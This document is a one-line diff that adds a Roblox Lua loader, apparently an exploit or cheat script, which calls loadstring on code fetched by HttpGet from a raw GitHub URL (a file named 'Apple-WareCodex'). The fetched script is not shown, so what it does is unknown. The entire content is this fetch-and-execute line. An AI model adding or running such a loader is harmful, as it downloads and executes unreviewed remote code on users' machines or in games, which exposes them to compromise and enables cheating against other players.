@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1dontgiveaf/testscript69/main/Apple-WareCodex", true))()
